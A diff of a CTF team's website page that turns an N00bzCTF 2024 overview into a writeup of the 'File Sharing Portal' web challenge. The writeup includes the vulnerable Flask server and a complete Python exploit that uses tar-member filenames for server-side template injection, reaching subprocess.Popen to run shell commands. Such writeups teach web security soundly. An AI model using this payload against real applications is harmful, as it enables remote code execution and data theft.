@@ -20,10 +20,8 @@
     <meta charset="utf-8">
     <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>N00bzCTF - ByteTheCookies</title>
+    <title>File Sharing Portal - ByteTheCookies</title>
 
-    
-    <meta name="description" content="A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz." />
     
 
     
@@ -33,29 +31,40 @@
     
 
     
-        <meta property="og:url" content="http://localhost:1313/writeups/n00bzctf/">
+        <meta property="og:url" content="http://localhost:1313/writeups/noobzctf/filesharingportal/">
   <meta property="og:site_name" content="ByteTheCookies">
-  <meta property="og:title" content="N00bzCTF">
-  <meta property="og:description" content="A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.">
+  <meta property="og:title" content="File Sharing Portal">
+  <meta property="og:description" content="File Sharing Portal Description: Welcome to the file sharing portal! We only support tar files!
+Authors: NoobMaster &#43; NoobHacker
+Points: 478
+Solve: 119
+Introduction The ctf has a very simple structure: we have a form in which we are asked to insert a tar file; once the tar file has been inserted, it is unzipped and we are shown the name of files it contains; by clicking on the different files, we can read their contents.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2024-08-05T18:26:54+02:00">
-    <meta property="article:modified_time" content="2024-08-06T12:01:19+02:00">
-    <meta property="article:tag" content="CTF">
-    <meta property="article:tag" content="N00bz">
+    <meta property="article:published_time" content="2024-08-06T11:27:07+02:00">
+    <meta property="article:modified_time" content="2024-08-06T11:27:07+02:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Template Injection">
 
     
 
     
         
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="N00bzCTF">
-  <meta name="twitter:description" content="A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.">
+  <meta name="twitter:title" content="File Sharing Portal">
+  <meta name="twitter:description" content="File Sharing Portal Description: Welcome to the file sharing portal! We only support tar files!
+Authors: NoobMaster &#43; NoobHacker
+Points: 478
+Solve: 119
+Introduction The ctf has a very simple structure: we have a form in which we are asked to insert a tar file; once the tar file has been inserted, it is unzipped and we are shown the name of files it contains; by clicking on the different files, we can read their contents.">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
 
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
 
 
 
@@ -82,6 +91,20 @@
 
 
 
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
 
 
 
@@ -288,13 +311,9 @@
         
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#description">Description</a></li>
-    <li><a href="#performance-summary">Performance Summary</a></li>
-    <li><a href="#writeups">Writeups</a>
-      <ul>
-        <li></li>
-      </ul>
-    </li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#source">Source</a></li>
+    <li><a href="#solution">Solution</a></li>
   </ul>
 </nav>
         
@@ -313,8 +332,8 @@
         
     
     
-<h1 id="n00bz-ctf-2024" class="header-anchor-wrapper">N00bz CTF 2024
-  <a href="#n00bz-ctf-2024" class="header-anchor-link">
+<h1 id="file-sharing-portal" class="header-anchor-wrapper">File Sharing Portal
+  <a href="#file-sharing-portal" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -328,9 +347,13 @@
   </a>
 </h1>
 
+<p><strong>Description</strong>: Welcome to the file sharing portal! We only support tar files!</p>
+<p><strong>Authors</strong>: NoobMaster + NoobHacker</p>
+<p><strong>Points</strong>: 478</p>
+<p><strong>Solve</strong>: 119</p>
 
-<h2 id="description" class="header-anchor-wrapper">Description
-  <a href="#description" class="header-anchor-link">
+<h2 id="introduction" class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -344,10 +367,10 @@
   </a>
 </h2>
 
-<p>A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.</p>
+<p>The ctf has a very simple structure: we have a form in which we are asked to insert a <a href="https://en.wikipedia.org/wiki/Tar_(computing)">tar</a> file; once the tar file has been inserted, it is unzipped and we are shown the <code>name</code> of files it contains; by clicking on the different files, we can read their contents.</p>
 
-<h2 id="performance-summary" class="header-anchor-wrapper">Performance Summary
-  <a href="#performance-summary" class="header-anchor-link">
+<h2 id="source" class="header-anchor-wrapper">Source
+  <a href="#source" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -361,15 +384,73 @@
   </a>
 </h2>
 
-<ul>
-<li><strong>CTFs</strong>: 31/32</li>
-<li><strong>Total point</strong>: 9794.000</li>
-<li><strong>Position</strong>: 24</li>
-<li><strong>Rating points</strong>: 24.067</li>
-</ul>
+<p><strong>The source has comments added later to allow a better understanding of the code in the writeups</strong></p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: server.py
 
-<h2 id="writeups" class="header-anchor-wrapper">Writeups
-  <a href="#writeups" class="header-anchor-link">
+#!/usr/bin/env python3
+from flask import Flask, request, redirect, render_template, render_template_string
+import tarfile
+from hashlib import sha256
+import os
+app = Flask(__name__)
+
+@app.route('/',methods=['GET','POST'])
+def main():
+    # This function mainly deals with loading the tar file into the server's file system.
+    global username
+    if request.method == 'GET':
+        return render_template('index.html')
+    elif request.method == 'POST':
+        file = request.files['file']
+        if file.filename[-4:] != '.tar': # Check that the file passed is actually a tar file
+            return render_template_string(&quot;&lt;p&gt; We only support tar files as of right now!&lt;/p&gt;&quot;) # Otherwise, it renders an error message
+        name = sha256(os.urandom(16)).digest().hex() # Creates a random name that it will use to name our tar and the folder in the server's file system
+        os.makedirs(f&quot;./uploads/{name}&quot;, exist_ok=True) # Create the directory
+        file.save(f&quot;./uploads/{name}/{name}.tar&quot;) # Save the tar file
+        try:
+            # Extract the tar file
+            tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
+            tar_file.extractall(path=f'./uploads/{name}/')
+            return render_template_string(f&quot;&lt;p&gt;Tar file extracted! View &lt;a href='/view/{name}'&gt;here&lt;/a&gt;&quot;)
+        except:
+            return render_template_string(&quot;&lt;p&gt;Failed to extract file!&lt;/p&gt;&quot;)
+
+@app.route('/view/&lt;name&gt;')
+def view(name):
+    # This function displays the files contained in the .tar file
+    if not all([i in &quot;abcdef1234567890&quot; for i in name]): # Check that the file name is in hexadecimal, to avoid any kind of malicious input 
+        return render_template_string(&quot;&lt;p&gt;Error!&lt;/p&gt;&quot;)
+        #print(os.popen(f'ls ./uploads/{name}').read())
+            #print(name)
+    files = os.listdir(f&quot;./uploads/{name}&quot;) # List all files in the previously created folder 
+    out = '&lt;h1&gt;Files&lt;/h1&gt;&lt;br&gt;'
+    files.remove(f'{name}.tar')  # Remove the tar file from the list
+    for i in files:
+        out += f'&lt;a href=&quot;/read/{name}/{i}&quot;&gt;{i}&lt;/a&gt;' # Show via templates all file names
+       # except:
+    return render_template_string(out) # Render the template with the render_template_string function
+
+@app.route('/read/&lt;name&gt;/&lt;file&gt;')
+def read(name,file):
+    # The function shows the contents of the single file
+    if (not all([i in &quot;abcdef1234567890&quot; for i in name])): # Check that the file name is in hexadecimal, to avoid any kind of malicious input 
+        return render_template_string(&quot;&lt;p&gt;Error!&lt;/p&gt;&quot;)
+    if ((&quot;..&quot; in name) or (&quot;..&quot; in file)) or ((&quot;/&quot; in file) or &quot;/&quot; in name):  # Other controls to avoid path er
+        return render_template_string(&quot;&lt;p&gt;Error!&lt;/p&gt;&quot;)
+    f = open(f'./uploads/{name}/{file}') # Open the file
+    data = f.read()
+    f.close()
+    return data # Return the content of file
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=1337)
+
+
+</code></pre>
+<p>We can therefore see that there are several parameter checks, and at first one might think that the code is <code>100%</code> safe.</p>
+
+<h2 id="solution" class="header-anchor-wrapper">Solution
+  <a href="#solution" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -383,45 +464,82 @@
   </a>
 </h2>
 
+<p>The first thing that came to mind was to create a <a href="https://www.futurelearn.com/info/courses/linux-for-bioinformatics/0/steps/201767">symbolic link</a> to access the flag, and indeed this works (try with server.py), the problem is that the filename of the flag is unknown and this does not allow us to create a valid symbolic link.</p>
+<p>Once we realised this, we did a thorough analysis of the code and came to the conclusion that the only thing that was not being checked was the name of the unpacked tar file allowing us to insert anything. By combining this with the &lsquo;<code>render_template_string</code>&rsquo; function (a vulnerable function of flask), it is possible to perform a <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#what-is-ssti-server-side-template-injection">template injection</a>.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py
 
-<h4 id="web" class="header-anchor-wrapper">Web
-  <a href="#web" class="header-anchor-link">
-    <svg width="16px" height="16px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
-</svg>
+import requests
+import os
+import tarfile
+from bs4 import BeautifulSoup
 
-</svg>
-  </a>
-</h4>
+url = 'http://redacted.challs.n00bzunit3d.xyz:8080/'
 
-<ul>
-<li><a href="/writeups/noobzctf/filesharingportal/">File Sharing Portal</a></li>
-</ul>
 
-<h4 id="misc" class="header-anchor-wrapper">Misc
-  <a href="#misc" class="header-anchor-link">
-    <svg width="16px" height="16px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
-</svg>
+def create_tar(tar_name, file):
+    with tarfile.open(tar_name, 'w') as tar:
+        tar.add(file, arcname=os.path.basename(file))
+    print(f'Tar file created: {tar_name}')
 
-</svg>
-  </a>
-</h4>
 
-<ul>
-<li><a href="/writeups/noobzctf/waas/">Waas</a></li>
-</ul>
+def create_payload(payload):
+    with open(payload, 'w') as f:
+        f.write('Remember to byte the cookies')
 
+    create_tar('exploit.tar', payload)
+    print(f'Payload created: {payload}')
+
+
+def get_url_view(text):
+    soup = BeautifulSoup(text, 'html5lib')
+    return [a['href'] for a in soup.find_all('a', href=True)][0]
+
+
+def leak_subprocess_index():
+    payload = &quot;{{int.__class__.__base__.__subclasses__()}}&quot;
+    create_payload(payload)
+
+    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})
+
+    url_file = get_url_view(r.text)
+    r = requests.get(url + url_file)
+    text = r.text[r.text.index('[')+1:]
+
+    list_classes = text.split(',')
+
+    for i, c in enumerate(list_classes):
+        if 'subprocess.Popen' in c:
+            print(f'Index subprocess.Popen: {i}')
+            return str(i)
+
+
+def get_flag(index):
+    payload = &quot;{{int.__class__.__base__.__subclasses__()[&quot; + \
+        index + &quot;]('cat *', shell=True, stdout=-1).communicate()}}&quot;
+    create_payload(payload)
+
+    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})
+
+    url_file = get_url_view(r.text)
+    r = requests.get(url + url_file)
+
+    flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1]
+    print(f'Flag: {flag}')
+
+
+def main():
+    subprocess_index = leak_subprocess_index()
+    get_flag(subprocess_index)
+
+
+if __name__ == '__main__':
+    main()
+
+
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e}
+</code></pre>
+<p align='right'>Author: Akiidjk </p>
 </article>
 </div>
 
